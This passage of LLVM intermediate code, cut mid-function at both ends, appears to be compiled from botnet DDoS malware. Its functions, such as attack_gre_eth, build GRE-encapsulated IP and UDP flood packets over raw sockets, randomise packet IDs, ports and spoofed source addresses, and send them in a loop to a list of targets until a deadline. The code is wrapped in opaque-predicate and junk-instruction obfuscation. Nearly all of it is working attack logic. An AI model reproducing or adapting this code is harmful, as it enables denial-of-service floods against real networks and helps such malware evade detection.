  %551 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %559 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %558, i32 0, i32 7
  store i16 0, i16* %559, align 2
  %560 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %561 = bitcast %struct.iphdr* %560 to i16*
  %562 = call zeroext i16 @checksum_generic(i16* %561, i32 20)
  %563 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %564 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %563, i32 0, i32 7
  store i16 %562, i16* %564, align 2
  %565 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %566 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %565, i32 0, i32 3
  store i16 0, i16* %566, align 2
  %567 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %568 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %569 = bitcast %struct.udphdr* %568 to i8*
  %570 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %571 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %570, i32 0, i32 2
  %572 = load i16, i16* %571, align 2
  %573 = load i32, i32* %20, align 4
  %574 = sext i32 %573 to i64
  %575 = add i64 8, %574
  %576 = trunc i64 %575 to i32
  %577 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %567, i8* %569, i16 zeroext %572, i32 %576)
  %578 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %579 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %578, i32 0, i32 3
  store i16 %577, i16* %579, align 2
  %580 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %581 = load i32, i32* %11, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %580, i64 %582
  %584 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i32 0, i32 0
  %585 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %584, i32 0, i32 0
  store i16 2, i16* %585, align 4
  %586 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %587 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %586, i32 0, i32 9
  %588 = load i32, i32* %587, align 4
  %589 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %590 = load i32, i32* %11, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %589, i64 %591
  %593 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i32 0, i32 0
  %594 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %593, i32 0, i32 2
  %595 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %594, i32 0, i32 0
  store i32 %588, i32* %595, align 4
  %596 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %597 = load i32, i32* %11, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %600, i32 0, i32 1
  store i16 0, i16* %601, align 2
  %602 = load i32, i32* %12, align 4
  %603 = load i8*, i8** %29, align 8
  %604 = load i32, i32* %20, align 4
  %605 = sext i32 %604 to i64
  %606 = add i64 52, %605
  %607 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %608 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %609 = load i32, i32* %11, align 4
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i64 %610
  %612 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %611, i32 0, i32 0
  %613 = bitcast %struct.sockaddr_in* %612 to %struct.sockaddr*
  store %struct.sockaddr* %613, %struct.sockaddr** %607, align 8
  %614 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %615 = load %struct.sockaddr*, %struct.sockaddr** %614, align 8
  %616 = call i64 @sendto(i32 %602, i8* %603, i64 %606, i32 16384, %struct.sockaddr* %615, i32 16)
  br label %617

; <label>:617:                                    ; preds = %550
  %618 = load i32, i32* %11, align 4
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %11, align 4
  br label %363

; <label>:620:                                    ; preds = %363
  %621 = load i32, i32* @x.19
  %622 = load i32, i32* @y.20
  %623 = sub i32 %621, 1
  %624 = mul i32 %621, %623
  %625 = urem i32 %624, 2
  %626 = icmp eq i32 %625, 0
  %627 = icmp slt i32 %622, 10
  %628 = or i1 %626, %627
  br i1 %628, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %620
  %629 = call i64 @time(i64* null) #6
  %630 = load i32, i32* %24, align 4
  %631 = sext i32 %630 to i64
  %632 = icmp sgt i64 %629, %631
  %633 = load i32, i32* @x.19
  %634 = load i32, i32* @y.20
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %632, label %641, label %642

; <label>:641:                                    ; preds = %originalBBpart2118
  br label %659

; <label>:642:                                    ; preds = %originalBBpart2118
  %643 = load i32, i32* @x.19
  %644 = load i32, i32* @y.20
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %642
  %651 = load i32, i32* @x.19
  %652 = load i32, i32* @y.20
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %346

; <label>:659:                                    ; preds = %641, %92, %86
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %95
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %171
  %660 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %661 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %660, i32 0, i32 6
  store i8 47, i8* %661, align 1
  %662 = load i32, i32* %23, align 4
  %663 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %664 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %663, i32 0, i32 8
  store i32 %662, i32* %664, align 4
  %665 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %666 = load i32, i32* %11, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %665, i64 %667
  %669 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %668, i32 0, i32 1
  %670 = load i32, i32* %669, align 4
  %671 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %672 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %671, i32 0, i32 9
  store i32 %670, i32* %672, align 4
  %673 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %674 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %675 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %674, i32 0, i32 1
  store i16 %673, i16* %675, align 2
  %676 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %677 = bitcast %struct.iphdr* %676 to i8*
  %678 = load i8, i8* %677, align 4
  %_ = sub i8 0, %678
  %gen = add i8 %_, 15
  %_2 = sub i8 %678, 15
  %gen3 = mul i8 %_2, 15
  %_4 = sub i8 0, %678
  %gen5 = add i8 %_4, 15
  %_6 = shl i8 %678, 15
  %_7 = sub i8 %678, 15
  %gen8 = mul i8 %_7, 15
  %_9 = sub i8 %678, 15
  %gen10 = mul i8 %_9, 15
  %679 = and i8 %678, 15
  %_11 = sub i8 %679, 64
  %gen12 = mul i8 %_11, 64
  %_13 = shl i8 %679, 64
  %_14 = shl i8 %679, 64
  %_15 = sub i8 0, %679
  %gen16 = add i8 %_15, 64
  %_17 = shl i8 %679, 64
  %_18 = sub i8 0, %679
  %gen19 = add i8 %_18, 64
  %680 = or i8 %679, 64
  store i8 %680, i8* %677, align 4
  %681 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %682 = bitcast %struct.iphdr* %681 to i8*
  %683 = load i8, i8* %682, align 4
  %_20 = sub i8 0, %683
  %gen21 = add i8 %_20, -16
  %_22 = sub i8 %683, -16
  %gen23 = mul i8 %_22, -16
  %684 = and i8 %683, -16
  %_24 = sub i8 0, %684
  %gen25 = add i8 %_24, 5
  %_26 = shl i8 %684, 5
  %685 = or i8 %684, 5
  store i8 %685, i8* %682, align 4
  %686 = load i8, i8* %14, align 1
  %687 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %688 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %687, i32 0, i32 1
  store i8 %686, i8* %688, align 1
  %689 = load i32, i32* %20, align 4
  %690 = sext i32 %689 to i64
  %_27 = sub i64 28, %690
  %gen28 = mul i64 %_27, %690
  %_29 = sub i64 28, %690
  %gen30 = mul i64 %_29, %690
  %_31 = sub i64 28, %690
  %gen32 = mul i64 %_31, %690
  %_33 = shl i64 28, %690
  %_34 = sub i64 28, %690
  %gen35 = mul i64 %_34, %690
  %_36 = sub i64 0, 28
  %gen37 = add i64 %_36, %690
  %_38 = shl i64 28, %690
  %691 = add i64 28, %690
  %692 = trunc i64 %691 to i16
  %693 = call zeroext i16 @htons(i16 zeroext %692) #7
  %694 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %695 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %694, i32 0, i32 2
  store i16 %693, i16* %695, align 2
  %696 = load i16, i16* %15, align 2
  %697 = zext i16 %696 to i32
  %_39 = shl i32 %697, -1
  %698 = xor i32 %697, -1
  %699 = trunc i32 %698 to i16
  %700 = call zeroext i16 @htons(i16 zeroext %699) #7
  %701 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i32 0, i32 3
  store i16 %700, i16* %702, align 4
  %703 = load i8, i8* %16, align 1
  %704 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %705 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %704, i32 0, i32 5
  store i8 %703, i8* %705, align 4
  %706 = load i8, i8* %17, align 1
  %707 = icmp ne i8 %706, 0
  br label %originalBB1

originalBB43alteredBB:                            ; preds = %originalBB43, %236
  %708 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %709 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %710 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %709, i32 0, i32 4
  store i16 %708, i16* %710, align 2
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %256
  %711 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %712 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %711, i32 0, i32 6
  store i8 17, i8* %712, align 1
  %713 = call i32 @rand_next()
  %714 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %715 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %714, i32 0, i32 8
  store i32 %713, i32* %715, align 4
  %716 = load i8, i8* %22, align 1
  %717 = icmp ne i8 %716, 0
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %286
  %718 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %719 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %718, i32 0, i32 8
  %720 = load i32, i32* %719, align 4
  %_52 = sub i32 0, %720
  %gen53 = add i32 %_52, 1024
  %_54 = sub i32 0, %720
  %gen55 = add i32 %_54, 1024
  %_56 = shl i32 %720, 1024
  %_57 = sub i32 0, %720
  %gen58 = add i32 %_57, 1024
  %721 = sub i32 %720, 1024
  %_59 = shl i32 %721, -1
  %722 = xor i32 %721, -1
  %723 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %724 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %723, i32 0, i32 9
  store i32 %722, i32* %724, align 4
  br label %originalBB51

originalBB63alteredBB:                            ; preds = %originalBB63, %329
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %346
  store i32 0, i32* %11, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %424
  %725 = load i16, i16* %15, align 2
  %726 = zext i16 %725 to i32
  %727 = icmp eq i32 %726, 65535
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %444
  %728 = call i32 @rand_next()
  %_76 = shl i32 %728, 65535
  %_77 = shl i32 %728, 65535
  %_78 = shl i32 %728, 65535
  %_79 = sub i32 0, %728
  %gen80 = add i32 %_79, 65535
  %_81 = shl i32 %728, 65535
  %_82 = sub i32 0, %728
  %gen83 = add i32 %_82, 65535
  %_84 = sub i32 %728, 65535
  %gen85 = mul i32 %_84, 65535
  %_86 = sub i32 %728, 65535
  %gen87 = mul i32 %_86, 65535
  %729 = and i32 %728, 65535
  %730 = trunc i32 %729 to i16
  %731 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %732 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %731, i32 0, i32 3
  store i16 %730, i16* %732, align 4
  %733 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %734 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %733, i32 0, i32 3
  %735 = load i16, i16* %734, align 4
  %736 = zext i16 %735 to i32
  %_88 = shl i32 %736, 1000
  %_89 = shl i32 %736, 1000
  %_90 = shl i32 %736, 1000
  %_91 = sub i32 %736, 1000
  %gen92 = mul i32 %_91, 1000
  %_93 = sub i32 0, %736
  %gen94 = add i32 %_93, 1000
  %_95 = sub i32 %736, 1000
  %gen96 = mul i32 %_95, 1000
  %_97 = sub i32 %736, 1000
  %gen98 = mul i32 %_97, 1000
  %737 = sub nsw i32 %736, 1000
  %_99 = shl i32 %737, -1
  %_100 = shl i32 %737, -1
  %_101 = shl i32 %737, -1
  %738 = xor i32 %737, -1
  %739 = trunc i32 %738 to i16
  %740 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %741 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %740, i32 0, i32 3
  store i16 %739, i16* %741, align 4
  br label %originalBB75

originalBB105alteredBB:                           ; preds = %originalBB105, %479
  %742 = call i32 @rand_next()
  %_106 = shl i32 %742, 65535
  %_107 = sub i32 0, %742
  %gen108 = add i32 %_107, 65535
  %743 = and i32 %742, 65535
  %744 = trunc i32 %743 to i16
  %745 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %746 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %745, i32 0, i32 0
  store i16 %744, i16* %746, align 2
  br label %originalBB105

originalBB112alteredBB:                           ; preds = %originalBB112, %514
  %747 = call i32 @rand_next()
  %748 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %749 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %748, i32 0, i32 9
  store i32 %747, i32* %749, align 4
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %620
  %750 = call i64 @time(i64* null) #6
  %751 = load i32, i32* %24, align 4
  %752 = sext i32 %751 to i64
  %753 = icmp sgt i64 %750, %752
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %642
  br label %originalBB120
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %5
  br label %650

; <label>:95:                                     ; preds = %5
  %96 = load i32, i32* @x.21
  %97 = load i32, i32* @y.22
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %95
  store i32 1, i32* %11, align 4
  %104 = load i32, i32* %12, align 4
  %105 = bitcast i32* %11 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %107, label %116, label %135

; <label>:116:                                    ; preds = %originalBBpart2
  %117 = load i32, i32* @x.21
  %118 = load i32, i32* @y.22
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %116
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  %127 = load i32, i32* @x.21
  %128 = load i32, i32* @y.22
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %650

; <label>:135:                                    ; preds = %originalBBpart2
  %136 = load i32, i32* @x.21
  %137 = load i32, i32* @y.22
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %135
  store i32 0, i32* %11, align 4
  %144 = load i32, i32* @x.21
  %145 = load i32, i32* @y.22
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %152

; <label>:152:                                    ; preds = %340, %originalBBpart28
  %153 = load i32, i32* %11, align 4
  %154 = load i8, i8* %7, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %153, %155
  br i1 %156, label %157, label %343

; <label>:157:                                    ; preds = %152
  %158 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %159 = load i8**, i8*** %13, align 8
  %160 = load i32, i32* %11, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %13, align 8
  %164 = load i32, i32* %11, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %25, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.grehdr*
  store %struct.grehdr* %171, %struct.grehdr** %26, align 8
  %172 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %173 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %172, i64 1
  %174 = bitcast %struct.grehdr* %173 to %struct.ethhdr*
  store %struct.ethhdr* %174, %struct.ethhdr** %27, align 8
  %175 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %176 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %175, i64 1
  %177 = bitcast %struct.ethhdr* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %28, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %29, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, 15
  %185 = or i8 %184, 64
  store i8 %185, i8* %182, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, -16
  %190 = or i8 %189, 5
  store i8 %190, i8* %187, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 1
  store i8 %191, i8* %193, align 1
  %194 = load i32, i32* %20, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 66, %195
  %197 = trunc i64 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %15, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %16, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %17, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %157
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %157
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 47, i8* %216, align 1
  %217 = load i32, i32* %23, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %221 = load i32, i32* %11, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  %228 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %229 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %230 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = call zeroext i16 @htons(i16 zeroext 2048) #7
